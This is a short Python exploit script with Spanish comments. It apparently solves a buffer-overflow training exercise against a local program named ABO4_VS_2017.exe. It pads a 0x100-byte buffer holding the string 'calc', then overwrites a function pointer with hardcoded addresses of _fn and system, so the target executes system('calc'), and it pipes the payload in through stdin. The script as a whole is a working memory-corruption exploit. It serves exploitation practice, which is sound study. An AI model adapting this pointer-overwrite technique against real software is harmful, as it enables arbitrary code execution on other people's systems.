import sys
import binascii
from subprocess import Popen, PIPE

buff = b"calc" + b"\x00" 
pointer_fn = b"\x00\x50\x41\x00" # funcion _fn
pointer_system = b"\x57\x26\x40\x00" # funcion system
pbuff = b"\x90" * 4

buffer =  buff + b"A" * (0x100 - len(buff))
buffer += pointer_fn + b"\n"
buffer += pointer_system

payload = buffer

p1 = Popen("ABO4_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")

p1.communicate(payload)
p1.wait()
input()